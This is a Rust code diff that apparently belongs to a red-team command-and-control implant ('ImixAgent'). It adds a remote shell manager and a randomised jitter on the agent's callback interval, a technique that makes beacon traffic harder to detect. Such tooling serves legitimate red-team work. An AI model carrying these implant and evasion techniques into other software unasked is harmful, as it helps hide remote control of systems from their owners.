@@ -10,6 +10,7 @@ use pb::config::Config;
 use transport::{ActiveTransport, Transport};
 
 pub static SHUTDOWN: AtomicBool = AtomicBool::new(false);
+const MAX_BUF_SHELL_MESSAGES: usize = 65535;
 
 pub async fn run_agent() -> Result<()> {
     init_logger();
@@ -26,12 +27,20 @@ pub async fn run_agent() -> Result<()> {
 
     let handle = tokio::runtime::Handle::current();
     let task_registry = Arc::new(TaskRegistry::new());
+
+    let (shell_manager_tx, shell_manager_rx) = tokio::sync::mpsc::channel(MAX_BUF_SHELL_MESSAGES);
+
     let agent = Arc::new(ImixAgent::new(
         config,
         transport,
         handle,
         task_registry.clone(),
+        shell_manager_tx,
     ));
+
+    // Start Shell Manager
+    let shell_manager = crate::shell::manager::ShellManager::new(agent.clone(), shell_manager_rx);
+    agent.clone().start_shell_manager(shell_manager);
 
     // Track the last interval we slept for, as a fallback in case we fail to read the config
     let mut last_interval = agent.get_callback_interval_u64().unwrap_or(5);
@@ -129,15 +138,27 @@ async fn process_tasks(agent: &ImixAgent<ActiveTransport>, _registry: &TaskRegis
 
 async fn sleep_until_next_cycle(agent: &ImixAgent<ActiveTransport>, start: Instant) -> Result<()> {
     let interval = agent.get_callback_interval_u64()?;
-    let delay = match interval.checked_sub(start.elapsed().as_secs()) {
-        Some(secs) => Duration::from_secs(secs),
-        None => Duration::from_secs(0),
-    };
+    let jitter = agent.get_callback_jitter().unwrap_or(0.0).clamp(0.0, 1.0);
+
+    // Generate random jitter [0.0, jitter]
+    let generated_jitter = rand::random::<f32>() * jitter;
+
+    // Calculate effective interval
+    let effective_interval_secs = (interval as f32) * (1.0 - generated_jitter);
+
+    // Calculate remaining sleep time: effective_interval - elapsed
+    let elapsed_secs = start.elapsed().as_secs_f32();
+    let sleep_secs = (effective_interval_secs - elapsed_secs).max(0.0);
+
+    let delay = Duration::from_secs_f32(sleep_secs);
+
     #[cfg(debug_assertions)]
     log::info!(
-        "Callback complete (duration={}s, sleep={}s)",
-        start.elapsed().as_secs(),
-        delay.as_secs()
+        "Callback complete (duration={:.2}s, sleep={:.2}s, interval={}s, jitter={:.2})",
+        elapsed_secs,
+        sleep_secs,
+        interval,
+        jitter
     );
     tokio::time::sleep(delay).await;
     Ok(())
